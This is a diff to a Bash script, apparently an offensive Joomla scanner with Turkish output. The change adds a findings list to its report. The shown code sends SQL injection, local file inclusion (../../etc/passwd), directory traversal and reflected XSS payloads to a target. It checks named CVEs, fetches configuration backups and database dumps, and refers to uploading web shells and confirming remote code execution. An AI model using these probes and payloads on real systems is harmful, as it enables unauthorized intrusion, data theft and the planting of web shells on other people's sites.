@@ -16,7 +16,7 @@ CYAN='\033[0;36m'
 NC='\033[0m'
 
 # Değişkenler
-SCRIPT_VERSION="3.5"
+SCRIPT_VERSION="3.6"
 SCRIPT_NAME="Joomla V${SCRIPT_VERSION} Scanner"
 PAYLOAD_FILE="b0yner.txt"
 GITHUB_RAW_URL="https://raw.githubusercontent.com/Dx3iZ/Joomla/refs/heads/main/joom.sh"
@@ -55,6 +55,7 @@ upload_count=0
 UPLOAD_TOTAL=35
 declare -a upload_success
 declare -a RCE_SHELLS
+declare -a REPORT_FINDINGS
 DETECTED="false"
 VERSION="Bulunamadi"
 
@@ -66,7 +67,7 @@ verify_upload() {
         echo -e "    ${GREEN}[✔]${NC} Yukleme basarili: $method"
         upload_success+=("${method}|${check_url}")
     else
-        echo -e "    ${YELLOW}[-]${NC} Yukleme basarisiz: $method (HTTP $check_resp)"
+        echo -e "    ${YELLOW}[-]${NC} Yukleme basarisiz: $method (HTTP $check_resp)"; REPORT_FINDINGS+=("[-] Yukleme basarisiz: $method (HTTP $check_resp)")
     fi
     upload_count=$((upload_count + 1))
 }
@@ -109,7 +110,7 @@ if [ -n "$META_CHECK" ]; then
     echo -e "    ${GREEN}[✔]${NC} 'joomla' ifadesi bulundu!"
     DETECTED="true"
 else
-    echo -e "    ${YELLOW}[-]${NC} Meta generator'da bulunamadi."
+    echo -e "    ${YELLOW}[-]${NC} Meta generator'da bulunamadi."; REPORT_FINDINGS+=("[-] Meta generator'da bulunamadi.")
 fi
 
 # Test 2: /administrator
@@ -119,7 +120,7 @@ if [ "$ADMIN_CHECK" = "200" ]; then
     echo -e "    ${GREEN}[✔]${NC} /administrator/ erisilebilir!"
     if [ "$DETECTED" = "false" ]; then DETECTED="true"; fi
 else
-    echo -e "    ${YELLOW}[-]${NC} /administrator/ erisilemedi (HTTP $ADMIN_CHECK)."
+    echo -e "    ${YELLOW}[-]${NC} /administrator/ erisilemedi (HTTP $ADMIN_CHECK)."; REPORT_FINDINGS+=("[-] /administrator/ erisilemedi (HTTP $ADMIN_CHECK).")
 fi
 
 # Test 3: /README.txt
@@ -129,7 +130,7 @@ if echo "$RESP" | grep -qi "joomla"; then
     echo -e "    ${GREEN}[✔]${NC} README.txt Joomla iceriyor!"
     if [ "$DETECTED" = "false" ]; then DETECTED="true"; fi
 else
-    echo -e "    ${YELLOW}[-]${NC} README.txt Joomla bilgisi bulunamadi."
+    echo -e "    ${YELLOW}[-]${NC} README.txt Joomla bilgisi bulunamadi."; REPORT_FINDINGS+=("[-] README.txt Joomla bilgisi bulunamadi.")
 fi
 
 # Test 4: /language/en-GB/en-GB.xml
@@ -139,7 +140,7 @@ if echo "$RESP" | grep -qi "joomla"; then
     echo -e "    ${GREEN}[✔]${NC} Dil dosyasi Joomla iceriyor!"
     if [ "$DETECTED" = "false" ]; then DETECTED="true"; fi
 else
-    echo -e "    ${YELLOW}[-]${NC} Dil dosyasi bulunamadi."
+    echo -e "    ${YELLOW}[-]${NC} Dil dosyasi bulunamadi."; REPORT_FINDINGS+=("[-] Dil dosyasi bulunamadi.")
 fi
 
 # Test 5: robots.txt
@@ -149,7 +150,7 @@ if echo "$RESP" | grep -qi "joomla\|administrator\|components"; then
     echo -e "    ${GREEN}[✔]${NC} robots.txt Joomla ipuclari iceriyor!"
     if [ "$DETECTED" = "false" ]; then DETECTED="true"; fi
 else
-    echo -e "    ${YELLOW}[-]${NC} robots.txt Joomla ipucu bulunamadi."
+    echo -e "    ${YELLOW}[-]${NC} robots.txt Joomla ipucu bulunamadi."; REPORT_FINDINGS+=("[-] robots.txt Joomla ipucu bulunamadi.")
 fi
 
 if [ "$DETECTED" = "false" ]; then
@@ -250,7 +251,7 @@ if [ "$VERSION" = "Bulunamadi" ]; then
     echo -e "  ${BLUE}[8/8]${NC} /templates/system/css/system.css (CSS fingerprint) kontrol..."
     RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/templates/system/css/system.css" 2>/dev/null)
     if echo "$RESP" | grep -qi "joomla\|system.css"; then
-        echo -e "    ${YELLOW}[?]${NC} CSS dosyasi mevcut (versiyon tespit edilemedi)"
+        echo -e "    ${YELLOW}[?]${NC} CSS dosyasi mevcut (versiyon tespit edilemedi)"; REPORT_FINDINGS+=("[?] CSS dosyasi mevcut (versiyon tespit edilemedi)")
     fi
 fi
 
@@ -276,87 +277,87 @@ echo ""
 # CVE-2025-22207: com_scheduler SQLi
 echo -e "  ${BLUE}[CVE-2025-22207]${NC} com_scheduler SQLi test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_scheduler&task=api.run&id=1'" 2>/dev/null)
-if echo "$RESP" | grep -qi "error\|exception\|sql\|syntax"; then echo -e "    ${RED}[VULN]${NC} SQLi muhtemel!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi
+if echo "$RESP" | grep -qi "error\|exception\|sql\|syntax"; then echo -e "    ${RED}[VULN]${NC} SQLi muhtemel!"; REPORT_FINDINGS+=("[VULN] SQLi muhtemel!"); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; REPORT_FINDINGS+=("[-] Guvenli gorunuyor."); fi
 
 # CVE-2025-22213: Media Manager File Upload
 echo -e "  ${BLUE}[CVE-2025-22213]${NC} Media Manager dosya yukleme test..."
 TOKEN=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_media&task=api.display" 2>/dev/null | grep -oP '"csrf\.token":"\K[^"]+' | head -1)
-if [ -n "$TOKEN" ]; then echo -e "    ${RED}[VULN]${NC} Media Manager API token alindi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Token alinamadi."; fi
+if [ -n "$TOKEN" ]; then echo -e "    ${RED}[VULN]${NC} Media Manager API token alindi!"; REPORT_FINDINGS+=("[VULN] Media Manager API token alindi!"); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Token alinamadi."; REPORT_FINDINGS+=("[-] Token alinamadi."); fi
 
 # CVE-2025-25227: 2FA Bypass
 echo -e "  ${BLUE}[CVE-2025-25227]${NC} 2FA bypass test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/administrator/index.php?option=com_users&task=user.login" 2>/dev/null)
-if echo "$RESP" | grep -qi "token\|twofactor\|2fa"; then echo -e "    ${YELLOW}[?]${NC} 2FA sayfasi mevcut."; else echo -e "    ${YELLOW}[-]${NC} 2FA tespit edilemedi."; fi
+if echo "$RESP" | grep -qi "token\|twofactor\|2fa"; then echo -e "    ${YELLOW}[?]${NC} 2FA sayfasi mevcut."; REPORT_FINDINGS+=("[?] 2FA sayfasi mevcut."); else echo -e "    ${YELLOW}[-]${NC} 2FA tespit edilemedi."; REPORT_FINDINGS+=("[-] 2FA tespit edilemedi."); fi
 
 # CVE-2026-21630: com_content webservice SQLi
 echo -e "  ${BLUE}[CVE-2026-21630]${NC} com_content webservice SQLi test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/api/index.php/v1/content/articles?filter[search]=1'" 2>/dev/null)
-if echo "$RESP" | grep -qi "error\|exception\|sql\|syntax"; then echo -e "    ${RED}[VULN]${NC} SQLi muhtemel!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi
+if echo "$RESP" | grep -qi "error\|exception\|sql\|syntax"; then echo -e "    ${RED}[VULN]${NC} SQLi muhtemel!"; REPORT_FINDINGS+=("[VULN] SQLi muhtemel!"); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; REPORT_FINDINGS+=("[-] Guvenli gorunuyor."); fi
 
 # CVE-2026-21629: com_ajax ACL bypass
 echo -e "  ${BLUE}[CVE-2026-21629]${NC} com_ajax ACL bypass test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_ajax&format=json" 2>/dev/null)
-if echo "$RESP" | grep -qi "error\|exception\|access"; then echo -e "    ${YELLOW}[?]${NC} ACL bypass olabilir."; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi
+if echo "$RESP" | grep -qi "error\|exception\|access"; then echo -e "    ${YELLOW}[?]${NC} ACL bypass olabilir."; REPORT_FINDINGS+=("[?] ACL bypass olabilir."); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; REPORT_FINDINGS+=("[-] Guvenli gorunuyor."); fi
 
 # CVE-2026-23898: com_joomlaupdate file delete
 echo -e "  ${BLUE}[CVE-2026-23898]${NC} com_joomlaupdate dosya silme test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/administrator/index.php?option=com_joomlaupdate" 2>/dev/null)
-if echo "$RESP" | grep -qi "update\|joomlaupdate"; then echo -e "    ${YELLOW}[?]${NC} Guncelleme sayfasi mevcut."; else echo -e "    ${YELLOW}[-]${NC} Guncelleme sayfasi bulunamadi."; fi
+if echo "$RESP" | grep -qi "update\|joomlaupdate"; then echo -e "    ${YELLOW}[?]${NC} Guncelleme sayfasi mevcut."; REPORT_FINDINGS+=("[?] Guncelleme sayfasi mevcut."); else echo -e "    ${YELLOW}[-]${NC} Guncelleme sayfasi bulunamadi."; REPORT_FINDINGS+=("[-] Guncelleme sayfasi bulunamadi."); fi
 
 # CVE-2026-23899: Improper access check
 echo -e "  ${BLUE}[CVE-2026-23899]${NC} Improper access check test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/administrator/index.php" 2>/dev/null)
-if echo "$RESP" | grep -qi "login\|form\|password"; then echo -e "    ${YELLOW}[?]${NC} Admin giris sayfasi mevcut."; else echo -e "    ${YELLOW}[-]${NC} Admin sayfasina erisilemedi."; fi
+if echo "$RESP" | grep -qi "login\|form\|password"; then echo -e "    ${YELLOW}[?]${NC} Admin giris sayfasi mevcut."; REPORT_FINDINGS+=("[?] Admin giris sayfasi mevcut."); else echo -e "    ${YELLOW}[-]${NC} Admin sayfasina erisilemedi."; REPORT_FINDINGS+=("[-] Admin sayfasina erisilemedi."); fi
 
 # CVE-2025-63082: XSS data URLs
 echo -e "  ${BLUE}[CVE-2025-63082]${NC} XSS data URL test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=1&Itemid=1" 2>/dev/null)
-if echo "$RESP" | grep -qi "data:text/html"; then echo -e "    ${RED}[VULN]${NC} XSS data URL kullanimi tespit edildi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} XSS tespit edilemedi."; fi
+if echo "$RESP" | grep -qi "data:text/html"; then echo -e "    ${RED}[VULN]${NC} XSS data URL kullanimi tespit edildi!"; REPORT_FINDINGS+=("[VULN] XSS data URL kullanimi tespit edildi!"); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} XSS tespit edilemedi."; REPORT_FINDINGS+=("[-] XSS tespit edilemedi."); fi
 
 # CVE-2025-63083: XSS pagebreak
 echo -e "  ${BLUE}[CVE-2025-63083]${NC} XSS pagebreak test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&layout=pagebreak&id=1" 2>/dev/null)
-if echo "$RESP" | grep -qi "error\|exception"; then echo -e "    ${YELLOW}[?]${NC} Pagebreak hatasi var."; else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi
+if echo "$RESP" | grep -qi "error\|exception"; then echo -e "    ${YELLOW}[?]${NC} Pagebreak hatasi var."; REPORT_FINDINGS+=("[?] Pagebreak hatasi var."); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; REPORT_FINDINGS+=("[-] Guvenli gorunuyor."); fi
 
 # CVE-2023-23752: API Improper Access
 echo -e "  ${BLUE}[CVE-2023-23752]${NC} API improper access test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/api/index.php/v1/config/application?public=true" 2>/dev/null)
-if echo "$RESP" | grep -qi "sitename\|password\|db\|secret"; then echo -e "    ${RED}[VULN]${NC} API ile hassas bilgiler sizdi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} API guvenli."; fi
+if echo "$RESP" | grep -qi "sitename\|password\|db\|secret"; then echo -e "    ${RED}[VULN]${NC} API ile hassas bilgiler sizdi!"; REPORT_FINDINGS+=("[VULN] API ile hassas bilgiler sizdi!"); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} API guvenli."; REPORT_FINDINGS+=("[-] API guvenli."); fi
 
 # CVE-2015-8562: Unserialize RCE
 echo -e "  ${BLUE}[CVE-2015-8562]${NC} Unserialize RCE test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 -X POST "${TARGET}/index.php?option=com_users&view=registration" -d "user[password]=test" 2>/dev/null)
-if echo "$RESP" | grep -qi "error\|exception"; then echo -e "    ${YELLOW}[?]${NC} Unserialize zafiyeti olabilir."; else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi
+if echo "$RESP" | grep -qi "error\|exception"; then echo -e "    ${YELLOW}[?]${NC} Unserialize zafiyeti olabilir."; REPORT_FINDINGS+=("[?] Unserialize zafiyeti olabilir."); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; REPORT_FINDINGS+=("[-] Guvenli gorunuyor."); fi
 
 # CVE-2018-17856: com_joomlaupdate ACL
 echo -e "  ${BLUE}[CVE-2018-17856]${NC} com_joomlaupdate ACL test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_joomlaupdate" 2>/dev/null)
-if echo "$RESP" | grep -qi "update\|upload\|package"; then echo -e "    ${YELLOW}[?]${NC} Guncelleme bileseni mevcut."; else echo -e "    ${YELLOW}[-]${NC} Guncelleme bileseni bulunamadi."; fi
+if echo "$RESP" | grep -qi "update\|upload\|package"; then echo -e "    ${YELLOW}[?]${NC} Guncelleme bileseni mevcut."; REPORT_FINDINGS+=("[?] Guncelleme bileseni mevcut."); else echo -e "    ${YELLOW}[-]${NC} Guncelleme bileseni bulunamadi."; REPORT_FINDINGS+=("[-] Guncelleme bileseni bulunamadi."); fi
 
 # CVE-2017-8917: com_fields SQLi
 echo -e "  ${BLUE}[CVE-2017-8917]${NC} com_fields SQLi test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_fields&view=fields&list[fullordering]=1'" 2>/dev/null)
-if echo "$RESP" | grep -qi "error\|exception\|sql\|syntax"; then echo -e "    ${RED}[VULN]${NC} SQLi muhtemel!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi
+if echo "$RESP" | grep -qi "error\|exception\|sql\|syntax"; then echo -e "    ${RED}[VULN]${NC} SQLi muhtemel!"; REPORT_FINDINGS+=("[VULN] SQLi muhtemel!"); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; REPORT_FINDINGS+=("[-] Guvenli gorunuyor."); fi
 
 # CVE-2021-23132: com_media directory traversal/RCE
 echo -e "  ${BLUE}[CVE-2021-23132]${NC} com_media directory traversal test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_media&view=images&tmpl=component&folder=../../../etc" 2>/dev/null)
-if echo "$RESP" | grep -qi "error\|exception"; then echo -e "    ${YELLOW}[?]${NC} Directory traversal olabilir."; else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi
+if echo "$RESP" | grep -qi "error\|exception"; then echo -e "    ${YELLOW}[?]${NC} Directory traversal olabilir."; REPORT_FINDINGS+=("[?] Directory traversal olabilir."); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; REPORT_FINDINGS+=("[-] Guvenli gorunuyor."); fi
 
 # CVE-2013-5576: Trailing dot bypass
 echo -e "  ${BLUE}[CVE-2013-5576]${NC} Trailing dot bypass test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/administrator/." 2>/dev/null)
 if echo "$RESP" | head -1 | grep -c "403\|404" > /dev/null 2>&1; then
-    echo -e "    ${YELLOW}[-]${NC} Engellendi."
+    echo -e "    ${YELLOW}[-]${NC} Engellendi."; REPORT_FINDINGS+=("[-] Engellendi.")
 else
-    echo -e "    ${RED}[VULN]${NC} Trailing dot bypass calisiyor olabilir!"
+    echo -e "    ${RED}[VULN]${NC} Trailing dot bypass calisiyor olabilir!"; REPORT_FINDINGS+=("[VULN] Trailing dot bypass calisiyor olabilir!")
     VULN_COUNT=$((VULN_COUNT + 1))
 fi
 
 # CVE-2019-7743: phar:// object injection
 echo -e "  ${BLUE}[CVE-2019-7743]${NC} phar:// object injection test..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&id=1&view=article" 2>/dev/null)
-if echo "$RESP" | grep -qi "phar"; then echo -e "    ${RED}[VULN]${NC} phar:// kullanimi tespit edildi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; fi
+if echo "$RESP" | grep -qi "phar"; then echo -e "    ${RED}[VULN]${NC} phar:// kullanimi tespit edildi!"; REPORT_FINDINGS+=("[VULN] phar:// kullanimi tespit edildi!"); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} Guvenli gorunuyor."; REPORT_FINDINGS+=("[-] Guvenli gorunuyor."); fi
 
 # === LFI Testleri ===
 echo ""
@@ -364,15 +365,15 @@ echo -e "  ${BLUE}[*]${NC} LFI (Local File Inclusion) testleri..."
 
 # LFI - template
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=1&Itemid=1&template=../../../../etc/passwd" 2>/dev/null)
-if echo "$RESP" | grep -qi "root:"; then echo -e "    ${RED}[VULN]${NC} LFI - template parametresi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} LFI bulunamadi."; fi
+if echo "$RESP" | grep -qi "root:"; then echo -e "    ${RED}[VULN]${NC} LFI - template parametresi!"; REPORT_FINDINGS+=("[VULN] LFI - template parametresi!"); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} LFI bulunamadi."; REPORT_FINDINGS+=("[-] LFI bulunamadi."); fi
 
 # LFI - controller
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&controller=../../../../etc/passwd" 2>/dev/null)
-if echo "$RESP" | grep -qi "root:"; then echo -e "    ${RED}[VULN]${NC} LFI - controller parametresi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} LFI bulunamadi."; fi
+if echo "$RESP" | grep -qi "root:"; then echo -e "    ${RED}[VULN]${NC} LFI - controller parametresi!"; REPORT_FINDINGS+=("[VULN] LFI - controller parametresi!"); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} LFI bulunamadi."; REPORT_FINDINGS+=("[-] LFI bulunamadi."); fi
 
 # LFI - view
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=../../../../etc/passwd" 2>/dev/null)
-if echo "$RESP" | grep -qi "root:"; then echo -e "    ${RED}[VULN]${NC} LFI - view parametresi!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} LFI bulunamadi."; fi
+if echo "$RESP" | grep -qi "root:"; then echo -e "    ${RED}[VULN]${NC} LFI - view parametresi!"; REPORT_FINDINGS+=("[VULN] LFI - view parametresi!"); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} LFI bulunamadi."; REPORT_FINDINGS+=("[-] LFI bulunamadi."); fi
 
 # === SQLi Testleri ===
 echo ""
@@ -382,21 +383,21 @@ echo -e "  ${BLUE}[*]${NC} SQLi (SQL Injection) testleri..."
 SQLPAYLOAD1="'"
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=${SQLPAYLOAD1}" 2>/dev/null)
 if echo "$RESP" | grep -qi "sql\|syntax\|mysql\|error\|exception\|odbc"; then
-    echo -e "    ${RED}[VULN]${NC} SQLi - id parametresi (single quote)!"
+    echo -e "    ${RED}[VULN]${NC} SQLi - id parametresi (single quote)!"; REPORT_FINDINGS+=("[VULN] SQLi - id parametresi (single quote)!")
     VULN_COUNT=$((VULN_COUNT + 1))
 fi
 
 SQLPAYLOAD2="1' OR '1'='1"
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=${SQLPAYLOAD2}" 2>/dev/null)
 if echo "$RESP" | grep -qi "sql\|syntax\|mysql\|error\|exception\|odbc"; then
-    echo -e "    ${RED}[VULN]${NC} SQLi - id parametresi (OR injection)!"
+    echo -e "    ${RED}[VULN]${NC} SQLi - id parametresi (OR injection)!"; REPORT_FINDINGS+=("[VULN] SQLi - id parametresi (OR injection)!")
     VULN_COUNT=$((VULN_COUNT + 1))
 fi
 
 SQLPAYLOAD3='1" OR "1"="1'
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=${SQLPAYLOAD3}" 2>/dev/null)
 if echo "$RESP" | grep -qi "sql\|syntax\|mysql\|error\|exception\|odbc"; then
-    echo -e "    ${RED}[VULN]${NC} SQLi - id parametresi (double quote injection)!"
+    echo -e "    ${RED}[VULN]${NC} SQLi - id parametresi (double quote injection)!"; REPORT_FINDINGS+=("[VULN] SQLi - id parametresi (double quote injection)!")
     VULN_COUNT=$((VULN_COUNT + 1))
 fi
 
@@ -406,7 +407,7 @@ echo -e "  ${BLUE}[*]${NC} XSS (Cross-Site Scripting) testleri..."
 
 XSSPAYLOAD="<script>alert(1)</script>"
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/index.php?option=com_content&view=article&id=1&q=${XSSPAYLOAD}" 2>/dev/null)
-if echo "$RESP" | grep -qi "<script>alert(1)</script>"; then echo -e "    ${RED}[VULN]${NC} XSS yansitiliyor!"; VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} XSS bulunamadi."; fi
+if echo "$RESP" | grep -qi "<script>alert(1)</script>"; then echo -e "    ${RED}[VULN]${NC} XSS yansitiliyor!"; REPORT_FINDINGS+=("[VULN] XSS yansitiliyor!"); VULN_COUNT=$((VULN_COUNT + 1)); else echo -e "    ${YELLOW}[-]${NC} XSS bulunamadi."; REPORT_FINDINGS+=("[-] XSS bulunamadi."); fi
 
 # === Acik Dizin Testleri ===
 echo ""
@@ -415,7 +416,7 @@ echo -e "  ${BLUE}[*]${NC} Acik dizin testleri..."
 for DIR in "images" "media" "tmp" "logs" "cache" "backups" "administrator/logs"; do
     RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/${DIR}/" 2>/dev/null)
     if echo "$RESP" | grep -qi "Index of\|Directory listing\|<title>Index of"; then
-        echo -e "    ${RED}[VULN]${NC} Acik dizin: /${DIR}/"
+        echo -e "    ${RED}[VULN]${NC} Acik dizin: /${DIR}/"; REPORT_FINDINGS+=("[VULN] Acik dizin: /${DIR}/")
         VULN_COUNT=$((VULN_COUNT + 1))
     fi
 done
@@ -427,7 +428,7 @@ echo -e "  ${BLUE}[*]${NC} Hassas dosya testleri..."
 for FILE in "configuration.php" "configuration.php.bak" "configuration.php.old" "configuration.php~" ".htaccess" "db_backup.sql" "backup.sql"; do
     RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/${FILE}" 2>/dev/null)
     if echo "$RESP" | grep -qi "password\|host\|user\|db\|<?php"; then
-        echo -e "    ${RED}[VULN]${NC} Hassas dosya: /${FILE}"
+        echo -e "    ${RED}[VULN]${NC} Hassas dosya: /${FILE}"; REPORT_FINDINGS+=("[VULN] Hassas dosya: /${FILE}")
         VULN_COUNT=$((VULN_COUNT + 1))
     fi
 done
@@ -437,10 +438,10 @@ echo ""
 echo -e "  ${BLUE}[*]${NC} Kurulum dizini testi..."
 RESP=$(curl -s --connect-timeout 10 --max-time 15 "${TARGET}/installation/" 2>/dev/null)
 if echo "$RESP" | grep -qi "joomla\|install\|configuration\|language"; then
-    echo -e "    ${RED}[VULN]${NC} /installation/ dizini mevcut (yeniden kurulum tehlikesi)!"
+    echo -e "    ${RED}[VULN]${NC} /installation/ dizini mevcut (yeniden kurulum tehlikesi)!"; REPORT_FINDINGS+=("[VULN] /installation/ dizini mevcut (yeniden kurulum tehlikesi)!")
     VULN_COUNT=$((VULN_COUNT + 1))
 else
-    echo -e "    ${YELLOW}[-]${NC} /installation/ dizini bulunamadi."
+    echo -e "    ${YELLOW}[-]${NC} /installation/ dizini bulunamadi."; REPORT_FINDINGS+=("[-] /installation/ dizini bulunamadi.")
 fi
 
 # ──────────────────────────────────────────────────────────────
@@ -783,7 +784,7 @@ if [ ${#upload_success[@]} -gt 0 ]; then
 fi
 
 if [ "$RCE_FOUND" = false ]; then
-    echo -e "    ${YELLOW}[-]${NC} Hicbir shell'de RCE dogrulanamadi."
+    echo -e "    ${YELLOW}[-]${NC} Hicbir shell'de RCE dogrulanamadi."; REPORT_FINDINGS+=("[-] Hicbir shell'de RCE dogrulanamadi.")
 fi
 
 # ──────────────────────────────────────────────────────────────
@@ -814,7 +815,7 @@ fi
 
 {
     echo "========================================="
-    echo "Joomla Scanner V${SCRIPT_VERSION} - Tarama Raporu"
+    echo "${SCRIPT_NAME} - Tarama Raporu"
     echo "========================================="
     echo "Hedef: $TARGET"
     echo "Tarih: $(date '+%Y-%m-%d %H:%M:%S')"
@@ -825,6 +826,14 @@ fi
     echo "RCE Basarili: $RCE_FOUND"
     echo "SQLi Tespiti: $SQLI_FOUND"
     echo ""
+
+    if [ ${#REPORT_FINDINGS[@]} -gt 0 ]; then
+        echo "Bulgular (Faz 1-3):"
+        for finding in "${REPORT_FINDINGS[@]}"; do
+            echo "  - $finding"
+        done
+        echo ""
+    fi
     if [ "$RCE_FOUND" = true ]; then
         echo "RCE Shell'leri:"
         for shell in "${RCE_SHELLS[@]}"; do
